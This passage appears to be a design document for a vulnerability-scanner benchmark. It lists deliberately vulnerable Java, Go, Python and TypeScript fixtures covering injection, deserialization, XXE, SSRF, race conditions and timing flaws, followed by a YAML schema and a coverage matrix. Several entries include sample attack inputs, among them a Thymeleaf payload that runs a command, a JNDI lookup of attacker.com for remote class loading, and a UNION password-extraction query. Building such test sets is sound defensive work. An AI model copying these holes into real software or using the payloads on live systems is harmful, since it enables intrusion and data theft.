#### gt-240: Spring deserialization via ObjectInputStream (CWE-502)

```java
@PostMapping("/import")
public String importData(@RequestBody byte[] data) throws Exception {
    ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
    Object obj = ois.readObject(); // sink: deserialization of untrusted data
    return obj.toString();
}
```

#### gt-241: Spring command injection via Runtime.exec (CWE-78)

```java
@GetMapping("/ping")
public String ping(@RequestParam String host) throws Exception {
    Process p = Runtime.getRuntime().exec("ping -c 1 " + host); // sink
    return new String(p.getInputStream().readAllBytes());
}
```

#### gt-242: Spring command injection via ProcessBuilder (CWE-78)

```java
@GetMapping("/exec")
public String execCmd(@RequestParam String cmd) throws Exception {
    ProcessBuilder pb = new ProcessBuilder("sh", "-c", cmd); // sink
    Process p = pb.start();
    return new String(p.getInputStream().readAllBytes());
}
```

#### gt-243: Spring XSS via direct response (CWE-79)

```java
@GetMapping(value = "/greet", produces = "text/html")
@ResponseBody
public String greet(@RequestParam String name) {
    return "<h1>Hello " + name + "</h1>"; // sink
}
```

#### gt-244: Spring path traversal (CWE-22)

```java
@GetMapping("/download")
public ResponseEntity<Resource> download(@RequestParam String file) {
    Path path = Paths.get("/uploads/" + file); // sink: no normalization
    Resource resource = new FileSystemResource(path);
    return ResponseEntity.ok().body(resource);
}
```

#### gt-245: Spring open redirect (CWE-601)

```java
@GetMapping("/redirect")
public String redirect(@RequestParam String url) {
    return "redirect:" + url; // sink
}
```

#### gt-246: Spring SQL injection via native query (CWE-89)

```java
@Repository
public interface UserRepository extends JpaRepository<User, Long> {
    @Query(value = "SELECT * FROM users WHERE name = '" + "?1" + "'", nativeQuery = true)
    List<User> findByName(String name); // misuse: ?1 in string concat, not placeholder
}
```

Note: This is a subtler pattern — the `?1` is inside string concatenation, not used as a JPA positional parameter.

#### gt-247: Spring SQLi interprocedural (CWE-89)

```java
@Service
public class QueryService {
    public String buildQuery(String table, String col, String val) {
        return "SELECT * FROM " + table + " WHERE " + col + " = '" + val + "'"; // taint preserved
    }
}

@RestController
public class DataController {
    @Autowired QueryService qs;
    @Autowired JdbcTemplate jdbc;
    @GetMapping("/data")
    public List<Map<String, Object>> data(@RequestParam String id) {
        String sql = qs.buildQuery("users", "id", id);
        return jdbc.queryForList(sql); // sink
    }
}
```

- **complexity**: inter

#### gt-248: Spring header injection (CWE-113)

```java
@GetMapping("/dl")
public ResponseEntity<byte[]> dl(@RequestParam String filename) {
    HttpHeaders headers = new HttpHeaders();
    headers.set("Content-Disposition", "attachment; filename=" + filename); // sink
    return new ResponseEntity<>(readFile(filename), headers, HttpStatus.OK);
}
```

#### gt-249: Spring CSRF disabled (CWE-352)

```java
@Configuration
public class SecurityConfig extends WebSecurityConfigurerAdapter {
    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http.csrf().disable(); // vuln: CSRF protection disabled globally
    }
}
```

#### gt-250: Spring actuator exposed (CWE-200)

```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        include: "*"  # exposes /actuator/env, /actuator/heapdump, etc.
```

#### gt-251: Spring Thymeleaf injection (CWE-1336)

```java
@GetMapping("/page")
public String page(@RequestParam String fragment, Model model) {
    return fragment; // sink: user controls Thymeleaf view name
    // attacker: GET /page?fragment=__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
}
```

#### gt-252: Spring LDAP injection (CWE-90)

```java
@GetMapping("/user")
public String findUser(@RequestParam String username) {
    String filter = "(uid=" + username + ")"; // sink
    ldapTemplate.search("dc=example,dc=com", filter, new UserMapper());
    return "found";
}
```

#### gt-253: Spring XSS via ModelAndView (CWE-79)

```java
@GetMapping("/profile")
public ModelAndView profile(@RequestParam String bio) {
    ModelAndView mv = new ModelAndView("profile");
    mv.addObject("bio", bio); // if template uses th:utext, XSS
    return mv;
}
// profile.html: <div th:utext="${bio}"></div>  <!-- unescaped output -->
```

#### gt-254: Spring XXE via DocumentBuilder (CWE-611)

```java
@PostMapping("/parse")
public String parse(@RequestBody String xml) throws Exception {
    DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
    // no setFeature to disable external entities
    Document doc = dbf.newDocumentBuilder().parse(new InputSource(new StringReader(xml))); // sink
    return doc.getDocumentElement().getTextContent();
}
```

### 4.3 Servlet Fixtures (gt-255 through gt-264)

#### gt-255: Servlet SQLi (CWE-89)

```java
// eval/fixtures/java/servlet/cwe_89/ServletSqli.java
@WebServlet("/user")
public class UserServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String id = req.getParameter("id");
        Connection conn = dataSource.getConnection();
        Statement stmt = conn.createStatement();
        ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE id = '" + id + "'"); // sink
    }
}
```

#### gt-256: Servlet XSS (CWE-79)

```java
@WebServlet("/search")
public class SearchServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String q = req.getParameter("q");
        resp.setContentType("text/html");
        resp.getWriter().write("<p>Results for: " + q + "</p>"); // sink
    }
}
```

#### gt-257: Servlet command injection (CWE-78)

```java
@WebServlet("/run")
public class RunServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String cmd = req.getParameter("cmd");
        Process p = Runtime.getRuntime().exec(cmd); // sink
    }
}
```

#### gt-258: Servlet path traversal (CWE-22)

```java
@WebServlet("/file")
public class FileServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String name = req.getParameter("name");
        File f = new File("/uploads/" + name); // sink
        Files.copy(f.toPath(), resp.getOutputStream());
    }
}
```

#### gt-259: Servlet SSRF (CWE-918)

```java
@WebServlet("/fetch")
public class FetchServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String url = req.getParameter("url");
        URL u = new URL(url);
        InputStream is = u.openStream(); // sink
        is.transferTo(resp.getOutputStream());
    }
}
```

#### gt-260: Servlet open redirect (CWE-601)

```java
@WebServlet("/login")
public class LoginServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String next = req.getParameter("next");
        resp.sendRedirect(next); // sink
    }
}
```

#### gt-261: Servlet header injection (CWE-113)

```java
@WebServlet("/dl")
public class DownloadServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String fname = req.getParameter("file");
        resp.setHeader("Content-Disposition", "attachment; filename=" + fname); // sink
    }
}
```

#### gt-262: Servlet XSS interprocedural (CWE-79)

```java
class HtmlHelper {
    static String wrapInDiv(String content) {
        return "<div>" + content + "</div>"; // taint preserved
    }
}

@WebServlet("/comment")
public class CommentServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String body = req.getParameter("body");
        String html = HtmlHelper.wrapInDiv(body);
        resp.getWriter().write(html); // sink
    }
}
```

- **complexity**: inter

#### gt-263: Servlet SQLi via PreparedStatement misuse (CWE-89)

```java
@WebServlet("/order")
public class OrderServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        String col = req.getParameter("sort");
        // PreparedStatement used, but ORDER BY is concatenated (not parameterizable)
        PreparedStatement ps = conn.prepareStatement(
            "SELECT * FROM orders WHERE user_id = ? ORDER BY " + col); // sink
        ps.setInt(1, getUserId(req));
        ps.executeQuery();
    }
}
```

- **complexity**: ctx — developer used parameterized query for WHERE but concatenated ORDER BY

#### gt-264: Servlet deserialization (CWE-502)

```java
@WebServlet("/import")
public class ImportServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws Exception {
        ObjectInputStream ois = new ObjectInputStream(req.getInputStream());
        Object obj = ois.readObject(); // sink
    }
}
```

### 4.4 General Java Fixtures (gt-265 through gt-274)

#### gt-265: Java XXE via SAXParser (CWE-611)

```java
SAXParserFactory factory = SAXParserFactory.newInstance();
// no setFeature to disable DTD/external entities
SAXParser parser = factory.newSAXParser();
parser.parse(untrustedInputStream, handler); // sink
```

#### gt-266: Java XXE via XMLReader (CWE-611)

```java
XMLReader reader = XMLReaderFactory.createXMLReader();
// no setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)
reader.parse(new InputSource(new StringReader(untrustedXml))); // sink
```

#### gt-267: Java unsafe reflection (CWE-470)

```java
String className = request.getParameter("class");
Class<?> clazz = Class.forName(className); // sink: user controls class loading
Object obj = clazz.getDeclaredConstructor().newInstance();
```

#### gt-268: Java JNDI injection (CWE-074)

```java
String name = request.getParameter("name");
InitialContext ctx = new InitialContext();
Object obj = ctx.lookup(name); // sink: JNDI lookup with user-controlled name
```

- **reference_exploit**: `GET /?name=ldap://attacker.com/Exploit` — remote class loading (Log4Shell-adjacent)

#### gt-269: Java weak crypto (CWE-327)

```java
Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding"); // vuln: DES is broken
cipher.init(Cipher.ENCRYPT_MODE, key);
```

#### gt-270: Java hardcoded password (CWE-798)

```java
String password = "admin123"; // vuln: hardcoded credential
DriverManager.getConnection("jdbc:mysql://db:3306/app", "root", password);
```

#### gt-271: Java insecure random (CWE-330)

```java
Random rand = new Random(); // vuln: not SecureRandom
String token = Long.toHexString(rand.nextLong());
```

#### gt-272: Java TLS skip verify (CWE-295)

```java
TrustManager[] trustAll = new TrustManager[]{
    new X509TrustManager() {
        public void checkClientTrusted(X509Certificate[] chain, String auth) {} // no-op
        public void checkServerTrusted(X509Certificate[] chain, String auth) {} // no-op
        public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
    }
};
SSLContext sc = SSLContext.getInstance("TLS");
sc.init(null, trustAll, new SecureRandom()); // vuln: trusts all certs
```

#### gt-273: Java XPath injection (CWE-643)

```java
String username = request.getParameter("user");
String expr = "//users/user[@name='" + username + "']/password"; // sink
XPath xpath = XPathFactory.newInstance().newXPath();
String password = xpath.evaluate(expr, document);
```

#### gt-274: Java regex DoS (CWE-1333)

```java
String pattern = request.getParameter("regex");
Pattern p = Pattern.compile(pattern); // sink: user-controlled regex
Matcher m = p.matcher(largeInput); // potential catastrophic backtracking
```

### 4.5 Source Projects for Real-World Java Validation

| Project | URL | Expected Patterns |
|---------|-----|-------------------|
| OWASP WebGoat | github.com/WebGoat/WebGoat | SQLi, XSS, XXE, SSRF, deserialization |
| Spring PetClinic (modified) | github.com/spring-projects/spring-petclinic | Inject vulns for benchmarking |
| Apache Struts CVEs | CVE-2017-5638, CVE-2018-11776 | OGNL injection, RCE |
| Benchmark OWASP | github.com/OWASP/Benchmark | 2,740 test cases across CWE categories |

---

## 5. Advanced Pattern Ground Truth (30 entries)

These entries cover vulnerability patterns that transcend individual languages and test the depth of taint analysis.

### 5.1 Distribution

| Pattern Category | Entries | Languages |
|-----------------|---------|-----------|
| Race conditions (CWE-362) | 5 | Go, Java, Python, TS |
| Business logic flaws | 5 | TS, Python, Java |
| Multi-step attack chains | 5 | TS, Python, Go |
| Second-order injection | 5 | TS, Python, Java |
| Prototype/object pollution | 5 | TS/JS only |
| Timing attacks (CWE-208) | 5 | Go, Java, Python, TS |

### 5.2 Race Conditions (gt-275 through gt-279)

#### gt-275: TOCTOU file race (Go, CWE-362)

```go
// eval/fixtures/go/stdlib/cwe_362/toctou_file.go
func handleUpload(w http.ResponseWriter, r *http.Request) {
    path := "/tmp/" + r.FormValue("name")
    if _, err := os.Stat(path); os.IsNotExist(err) { // check
        // window: attacker can create symlink here
        os.WriteFile(path, []byte(r.FormValue("data")), 0644) // use
    }
}
```

- **complexity**: ctx — requires understanding of TOCTOU window

#### gt-276: Double-spend in payment handler (TS, CWE-362)

```typescript
// eval/fixtures/typescript/advanced/cwe_362/double_spend.ts
app.post("/transfer", async (req, res) => {
    const { from, to, amount } = req.body;
    const balance = await db.query("SELECT balance FROM accounts WHERE id = $1", [from]);
    // race window: concurrent request can read same balance
    if (balance.rows[0].balance >= amount) {
        await db.query("UPDATE accounts SET balance = balance - $1 WHERE id = $2", [amount, from]);
        await db.query("UPDATE accounts SET balance = balance + $1 WHERE id = $2", [amount, to]);
    }
    res.json({ ok: true });
});
```

- **complexity**: ctx — no single taint path; requires concurrent execution understanding

#### gt-277: Race condition in counter (Python, CWE-362)

```python
# eval/fixtures/python/general/cwe_362/race_counter.py
import threading
counter = 0
def increment(request):
    global counter
    val = counter  # read
    # context switch possible here
    counter = val + 1  # write — lost update
    return str(counter)
```

#### gt-278: Race condition in session check (Java, CWE-362)

```java
// eval/fixtures/java/servlet/cwe_362/SessionRace.java
@WebServlet("/redeem")
public class RedeemServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
        HttpSession session = req.getSession();
        Boolean redeemed = (Boolean) session.getAttribute("coupon_redeemed");
        if (redeemed == null || !redeemed) { // check
            // race window
            session.setAttribute("coupon_redeemed", true); // use
            applyCoupon(req.getParameter("code"));
        }
    }
}
```

#### gt-279: TOCTOU in permission check (Go, CWE-362)

```go
func deleteFile(w http.ResponseWriter, r *http.Request) {
    path := r.FormValue("path")
    info, _ := os.Stat(path)
    if info.Mode().Perm()&0002 != 0 { // check: is world-writable?
        // window: file could be replaced with symlink
        os.Remove(path) // use
    }
}
```

### 5.3 Business Logic Flaws (gt-280 through gt-284)

#### gt-280: Price manipulation (TS, CWE-472)

```typescript
// eval/fixtures/typescript/advanced/cwe_472/price_manipulation.ts
app.post("/checkout", (req, res) => {
    const { itemId, price, quantity } = req.body; // price from client
    const total = price * quantity; // sink: using client-supplied price
    chargeCard(req.user, total);
});
```

- Client can send `{ itemId: "premium", price: 0.01, quantity: 1 }`

#### gt-281: Quantity overflow (Java, CWE-190)

```java
// eval/fixtures/java/spring/cwe_190/quantity_overflow.java
@PostMapping("/order")
public String order(@RequestParam int quantity, @RequestParam int unitPrice) {
    int total = quantity * unitPrice; // integer overflow possible
    if (total > 0 && total <= userBalance) { // negative total passes check
        deductBalance(total);
    }
    return "ok";
}
```

- **reference_exploit**: `quantity=2147483647, unitPrice=2` → overflow to negative

#### gt-282: Privilege boundary bypass (Python, CWE-285)

```python
# eval/fixtures/python/flask/cwe_285/priv_bypass.py
@app.route("/admin/user/<int:uid>", methods=["DELETE"])
@login_required
def delete_user(uid):
    # checks login but not admin role
    User.query.get(uid).delete()
    db.session.commit()
    return "deleted"
```

#### gt-283: Insecure direct object reference (TS, CWE-639)

```typescript
// eval/fixtures/typescript/advanced/cwe_639/idor.ts
app.get("/api/invoice/:id", (req, res) => {
    const invoice = await db.query("SELECT * FROM invoices WHERE id = $1", [req.params.id]);
    // no check that invoice belongs to req.user
    res.json(invoice.rows[0]); // sink: IDOR
});
```

#### gt-284: Discount code reuse (Python, CWE-799)

```python
# eval/fixtures/python/flask/cwe_799/discount_reuse.py
@app.route("/apply-discount", methods=["POST"])
def apply_discount():
    code = request.form["code"]
    discount = Discount.query.filter_by(code=code).first()
    if discount:
        apply_to_cart(discount.percent)  # no check for prior usage
        return "applied"
```

### 5.4 Multi-Step Attack Chains (gt-285 through gt-289)

#### gt-285: Auth → session fixation → privilege escalation (TS, CWE-384)

```typescript
// eval/fixtures/typescript/advanced/cwe_384/session_fixation.ts
app.post("/login", (req, res) => {
    const { user, pass } = req.body;
    if (authenticate(user, pass)) {
        // step 1: no session regeneration after login
        req.session.user = user;
        req.session.role = getUserRole(user);
        // step 2: attacker pre-sets session ID via cookie
        // step 3: attacker inherits authenticated session with role
        res.redirect("/dashboard");
    }
});
```

- **complexity**: ctx — 3-step chain
- **taint_path**: attacker-controlled session cookie → login preserves session ID → attacker accesses authenticated session

#### gt-286: Registration → stored XSS → admin compromise (Python, CWE-79)

```python
# eval/fixtures/python/flask/cwe_79/stored_xss_chain.py
@app.route("/register", methods=["POST"])
def register():
    name = request.form["name"]  # step 1: store unsanitized
    db.execute("INSERT INTO users (name) VALUES (?)", (name,))
    return redirect("/profile")

@app.route("/admin/users")
@admin_required
def admin_users():
    users = db.execute("SELECT name FROM users").fetchall()
    html = "".join(f"<li>{u['name']}</li>" for u in users)  # step 2: render without escaping
    return render_template_string(f"<ul>{html}</ul>")  # sink
```

- **complexity**: inter — taint stored in DB then retrieved in different handler

#### gt-287: File upload → path traversal → code execution (Go, CWE-434)

```go
// eval/fixtures/go/gin/cwe_434/upload_chain.go
r.POST("/upload", func(c *gin.Context) {
    file, _ := c.FormFile("file")
    name := file.Filename // step 1: user-controlled filename
    dst := "/var/www/cgi-bin/" + name // step 2: path traversal possible
    c.SaveUploadedFile(file, dst) // step 3: write executable to cgi-bin
})
```

#### gt-288: SQL injection → data exfil → account takeover (TS, CWE-89)

```typescript
// eval/fixtures/typescript/advanced/cwe_89/sqli_chain.ts
app.get("/forgot-password", async (req, res) => {
    const email = req.query.email as string;
    // step 1: SQLi in email lookup
    const user = await db.query(`SELECT * FROM users WHERE email = '${email}'`);
    // step 2: reset token exposed in response
    if (user.rows[0]) {
        const token = user.rows[0].reset_token;
        await sendResetEmail(user.rows[0].email, token);
        res.json({ status: "sent" }); // token leaked via UNION injection
    }
});
```

#### gt-289: Header injection → response splitting → cache poisoning (Java, CWE-113)

```java
// eval/fixtures/java/servlet/cwe_113/response_split.java
@WebServlet("/lang")
public class LangServlet extends HttpServlet {
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) {
        String lang = req.getParameter("lang");
        // step 1: inject CRLF in header
        resp.setHeader("Content-Language", lang); // sink
        // step 2: attacker sends lang=en%0d%0aContent-Length:%200%0d%0a%0d%0a<script>...
        // step 3: HTTP response splitting → cache poisoning
    }
}
```

### 5.5 Second-Order Injection (gt-290 through gt-294)

#### gt-290: Stored SQLi (TS, CWE-89)

```typescript
// eval/fixtures/typescript/advanced/cwe_89/stored_sqli.ts
// step 1: store user input
app.post("/profile", (req, res) => {
    db.query("INSERT INTO profiles (name) VALUES ($1)", [req.body.name]); // safe insert
    res.redirect("/profile");
});
// step 2: retrieve and use in unsafe context
app.get("/report", async (req, res) => {
    const profiles = await db.query("SELECT name FROM profiles");
    for (const p of profiles.rows) {
        // second-order: stored value used unsafely
        await db.query(`SELECT * FROM activity WHERE user_name = '${p.name}'`); // sink
    }
});
```

#### gt-291: Stored XSS (Python, CWE-79)

```python
# eval/fixtures/python/django/cwe_79/stored_xss.py
# step 1: save comment (safe — parameterized)
def save_comment(request):
    Comment.objects.create(body=request.POST["body"], author=request.user)

# step 2: render comment without escaping
def view_comments(request):
    comments = Comment.objects.all()
    html = "".join(f"<p>{c.body}</p>" for c in comments)
    return mark_safe(html)  # sink: stored XSS
```

#### gt-292: Stored command injection (Go, CWE-78)

```go
// eval/fixtures/go/gin/cwe_78/stored_cmdi.go
// step 1: save job config
r.POST("/jobs", func(c *gin.Context) {
    name := c.PostForm("name")
    cmd := c.PostForm("cmd")
    db.Exec("INSERT INTO jobs (name, cmd) VALUES (?, ?)", name, cmd) // safe insert
})
// step 2: execute stored command
r.POST("/jobs/:id/run", func(c *gin.Context) {
    id := c.Param("id")
    var cmd string
    db.QueryRow("SELECT cmd FROM jobs WHERE id = ?", id).Scan(&cmd)
    exec.Command("sh", "-c", cmd).Run() // sink: stored command injection
})
```

#### gt-293: Stored SSRF (Java, CWE-918)

```java
// eval/fixtures/java/spring/cwe_918/stored_ssrf.java
// step 1: save webhook URL
@PostMapping("/webhooks")
public void addWebhook(@RequestParam String url) {
    jdbc.update("INSERT INTO webhooks (url) VALUES (?)", url); // safe
}
// step 2: invoke stored URL
@Scheduled(fixedRate = 60000)
public void triggerWebhooks() {
    List<String> urls = jdbc.queryForList("SELECT url FROM webhooks", String.class);
    for (String url : urls) {
        restTemplate.getForObject(url, String.class); // sink: stored SSRF
    }
}
```

#### gt-294: Stored template injection (Python, CWE-1336)

```python
# eval/fixtures/python/flask/cwe_1336/stored_ssti.py
# step 1: save template
@app.route("/templates", methods=["POST"])
def save_template():
    name = request.form["name"]
    body = request.form["body"]
    db.execute("INSERT INTO templates (name, body) VALUES (?, ?)", (name, body))
    return "saved"

# step 2: render stored template
@app.route("/render/<name>")
def render(name):
    row = db.execute("SELECT body FROM templates WHERE name = ?", (name,)).fetchone()
    return render_template_string(row["body"])  # sink: stored SSTI
```

### 5.6 Prototype/Object Pollution (gt-295 through gt-299)

#### gt-295: Direct __proto__ pollution (TS, CWE-1321)

```typescript
// eval/fixtures/typescript/advanced/cwe_1321/proto_direct.ts
app.post("/config", (req, res) => {
    const config: any = {};
    for (const [key, val] of Object.entries(req.body)) {
        config[key] = val; // sink: req.body = {"__proto__":{"isAdmin":true}}
    }
    res.json(config);
});
```

#### gt-296: Nested merge pollution (TS, CWE-1321)

```typescript
// eval/fixtures/typescript/advanced/cwe_1321/proto_merge.ts
function deepMerge(target: any, source: any) {
    for (const key of Object.keys(source)) {
        if (typeof source[key] === "object" && source[key] !== null) {
            if (!target[key]) target[key] = {};
            deepMerge(target[key], source[key]); // recursive — pollutes prototype
        } else {
            target[key] = source[key]; // sink
        }
    }
}
app.post("/settings", (req, res) => {
    const defaults = { theme: "light" };
    deepMerge(defaults, req.body);
    res.json(defaults);
});
```

#### gt-297: constructor.prototype pollution (TS, CWE-1321)

```typescript
// eval/fixtures/typescript/advanced/cwe_1321/proto_constructor.ts
app.post("/update", (req, res) => {
    const obj: any = {};
    const path = req.body.path; // "constructor.prototype.isAdmin"
    const val = req.body.value; // true
    setNestedProperty(obj, path, val); // sink: sets constructor.prototype.isAdmin = true
    res.json({ ok: true });
});
```

#### gt-298: JSON.parse prototype pollution (TS, CWE-1321)

```typescript
// eval/fixtures/typescript/advanced/cwe_1321/proto_json.ts
app.post("/import", (req, res) => {
    const data = JSON.parse(req.body.payload);
    Object.assign({}, data); // if payload = {"__proto__":{"polluted":true}}, Object.assign spreads it
    res.json({ imported: true });
});
```

#### gt-299: Lodash-style set/merge pollution (TS, CWE-1321)

```typescript
// eval/fixtures/typescript/advanced/cwe_1321/proto_lodash.ts
import _ from "lodash";
app.post("/merge", (req, res) => {
    const config = { debug: false };
    _.merge(config, req.body); // sink: lodash.merge is vulnerable to prototype pollution
    res.json(config);
});
```

### 5.7 Timing Attacks (gt-300 through gt-304)

#### gt-300: Non-constant-time password comparison (Go, CWE-208)

```go
// eval/fixtures/go/stdlib/cwe_208/timing_password.go
func checkPassword(w http.ResponseWriter, r *http.Request) {
    stored := getStoredHash(r.FormValue("user"))
    provided := r.FormValue("pass")
    if stored == provided { // sink: == leaks timing info
        w.Write([]byte("ok"))
    }
}
// fix: use crypto/subtle.ConstantTimeCompare
```

#### gt-301: Non-constant-time token comparison (Java, CWE-208)

```java
// eval/fixtures/java/servlet/cwe_208/TimingToken.java
@WebServlet("/verify")
public class VerifyServlet extends HttpServlet {
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) {
        String expected = getStoredToken(req.getParameter("user"));
        String provided = req.getParameter("token");
        if (expected.equals(provided)) { // sink: String.equals short-circuits
            resp.getWriter().write("valid");
        }
    }
}
// fix: use MessageDigest.isEqual()
```

#### gt-302: Non-constant-time HMAC comparison (Python, CWE-208)

```python
# eval/fixtures/python/general/cwe_208/timing_hmac.py
import hmac, hashlib
def verify_signature(request):
    expected = compute_hmac(request.body)
    provided = request.headers.get("X-Signature")
    if expected == provided:  # sink: == is not constant-time
        return True
    return False
# fix: use hmac.compare_digest()
```

#### gt-303: Non-constant-time API key comparison (TS, CWE-208)

```typescript
// eval/fixtures/typescript/advanced/cwe_208/timing_apikey.ts
app.use((req, res, next) => {
    const key = req.headers["x-api-key"];
    if (key === process.env.API_KEY) { // sink: === short-circuits on first mismatch
        next();
    } else {
        res.status(401).json({ error: "unauthorized" });
    }
});
// fix: use crypto.timingSafeEqual()
```

#### gt-304: Early return on auth (Go, CWE-208)

```go
// eval/fixtures/go/stdlib/cwe_208/timing_auth.go
func authenticate(w http.ResponseWriter, r *http.Request) {
    user := r.FormValue("user")
    pass := r.FormValue("pass")
    storedUser := lookupUser(user)
    if storedUser == nil {
        http.Error(w, "unauthorized", 401)
        return // early return leaks user existence via timing
    }
    if !checkPassword(storedUser.Hash, pass) {
        http.Error(w, "unauthorized", 401)
        return
    }
    w.Write([]byte("ok"))
}
```

---

## 6. Fixture Standards

### 6.1 File Requirements

- Each fixture: self-contained, < 150 lines, compiles/runs in its language
- Minimal imports — only what's needed for the vulnerability pattern
- No external dependencies beyond the web framework and standard library
- Clear inline comments marking source and sink lines

### 6.2 Directory Structure

```
eval/
  fixtures/
    python/
      flask/
        cwe_89/
          sqli_fstring.py
          sqli_format.py
          sqli_percent.py
          sqli_interprocedural.py
        cwe_79/
          xss_render_template_string.py
          xss_markup.py
          stored_xss_chain.py
        cwe_78/
          cmdi_subprocess.py
          cmdi_os_system.py
        ...
      django/
        cwe_89/
          raw_query.py
          extra_query.py
          cursor_execute.py
        ...
      fastapi/
        cwe_89/
          sqli_fstring.py
          sqli_body.py
          sqli_dependency.py
        ...
      general/
        cwe_94/
          eval_env.py
          exec_file.py
          compile_exec.py
        cwe_502/
          pickle_loads.py
          yaml_load.py
        ...
    go/
      gin/
        cwe_89/
          sqli_concat.go
          sqli_sprintf.go
          sqli_interprocedural.go
        cwe_79/
          xss_write.go
          xss_data.go
        ...
      echo/
        cwe_89/
          sqli_concat.go
        ...
      chi/
        ...
      stdlib/
        cwe_89/
          sqli_concat.go
        cwe_362/
          toctou_file.go
        cwe_208/
          timing_password.go
          timing_auth.go
        ...
    java/
      spring/
        cwe_89/
          JdbcSqli.java
          JdbcSqliFormat.java
          NativeQuerySqli.java
          SpelInjection.java
        cwe_918/
          SsrfRestTemplate.java
          StoredSsrf.java
        ...
      servlet/
        cwe_89/
          ServletSqli.java
          PreparedStatementMisuse.java
        ...
      general/
        cwe_611/
          SaxXxe.java
          XmlReaderXxe.java
        cwe_502/
          ObjectInputStreamDeser.java
        ...
    typescript/
      advanced/
        cwe_362/
          double_spend.ts
        cwe_472/
          price_manipulation.ts
        cwe_639/
          idor.ts
        cwe_1321/
          proto_direct.ts
          proto_merge.ts
          proto_constructor.ts
          proto_json.ts
          proto_lodash.ts
        cwe_208/
          timing_apikey.ts
        ...
```

### 6.3 YAML Entry Format

Consistent with existing `eval/ground_truth/schema.py` (`GroundTruthEntry` model):

```yaml
id: gt-195
source_project: synthetic
commit_hash: "synthetic-no-commit"
cwe_id: CWE-89
cwe_name: SQL Injection
label: true_positive
affected_files:
  - eval/fixtures/go/gin/cwe_89/sqli_concat.go
line_numbers: [13]
taint_source: c.Query("id")
taint_sink: db.QueryRow() with string concatenation
taint_path:
  - "c.Query(\"id\") captures user input from query parameter"
  - "id variable concatenated into SQL string literal"
  - "db.QueryRow(concatenated_sql) executes attacker-controlled query"
complexity: simple
exploitable: true
reference_exploit: "GET /user?id=' UNION SELECT password FROM users-- extracts password column"
reference_fix_commit: null
notes: "Gin framework SQLi via direct string concatenation in db.QueryRow call. Idiomatic Go equivalent of JS string template injection."
```

### 6.4 Numbering Convention

| Range | Category |
|-------|----------|
| gt-145 to gt-194 | Python (Flask/Django/FastAPI/general) |
| gt-195 to gt-234 | Go (Gin/Echo/Chi/stdlib) |
| gt-235 to gt-274 | Java (Spring/Servlet/general) |
| gt-275 to gt-304 | Advanced patterns (cross-language) |
| gt-fp-040 to gt-fp-069 | Multi-language false positives |

### 6.5 Patched (Safe) Versions

For every vulnerable fixture, include a corresponding false-positive entry or patched variant. Examples:

**Vulnerable (gt-195):**
```go
db.QueryRow("SELECT * FROM users WHERE id = '" + id + "'")
```

**Patched (gt-fp-040):**
```go
db.QueryRow("SELECT * FROM users WHERE id = ?", id)  // parameterized — safe
```

Each patched version becomes a gt-fp-NNN entry with `label: false_positive` and `exploitable: false`.

---

## 7. Cross-Language Consistency

### 7.1 Coverage Matrix

Every supported CWE must have ground truth entries in all applicable languages. Target: no empty cells.

| CWE | TS/JS | Python | Go | Java | Advanced |
|-----|-------|--------|----|------|----------|
| CWE-89 (SQLi) | existing | gt-145,146,147,156,160,161,162,171,175,176,179,182 | gt-195,196,204,207,212,217,224,225,233 | gt-235,236,246,247,255,263 | gt-290 |
| CWE-79 (XSS) | existing | gt-148,155,163 | gt-197,198,208,215,216,218,226 | gt-243,253,256 | gt-286,291 |
| CWE-78 (CMDi) | existing | gt-150,151,167 | gt-200,209,223,227 | gt-241,242,257 | gt-292 |
| CWE-22 (Path Traversal) | existing | gt-154,169,189,190 | gt-199,211,219,228 | gt-244,258 | |
| CWE-918 (SSRF) | existing | gt-152,168,178 | gt-201,210,222,229 | gt-239,259 | gt-293 |
| CWE-94 (Code Injection) | existing | gt-153,183,185,186,192 | gt-205,232 | gt-237,251,267 | |
| CWE-502 (Deserialization) | existing | gt-159,174,184,187,188 | gt-206 | gt-240,264,265 | |
| CWE-611 (XXE) | existing | gt-193 | | gt-254,265,266 | |
| CWE-601 (Open Redirect) | existing | gt-157,172 | gt-203,213,230 | gt-245,260 | |
| CWE-113 (Header Injection) | existing | gt-173 | gt-202,214,234 | gt-248,261 | gt-289 |
| CWE-362 (Race Condition) | | gt-277 | gt-275,279 | gt-278 | gt-276 |
| CWE-208 (Timing Attack) | | gt-302 | gt-300,304 | gt-301 | gt-303 |
| CWE-352 (CSRF) | existing | gt-164 | gt-221 | gt-249 | |
| CWE-915 (Mass Assignment) | existing | gt-165 | | gt-238 | |
| CWE-1321 (Prototype Pollution) | | | | | gt-295-299 |
| CWE-1336 (SSTI) | existing | gt-149,170,294 | gt-205,232 | gt-251 | |
| CWE-285 (Auth Bypass) | existing | gt-282 | gt-220 | | |
| CWE-472 (Business Logic) | | | | gt-281 | gt-280 |
| CWE-639 (IDOR) | | | | | gt-283 |
| CWE-798 (Hardcoded Creds) | | | | gt-270 | |
| CWE-327 (Weak Crypto) | | | | gt-269 | |
| CWE-330 (Insecure Random) | | | | gt-271 | |
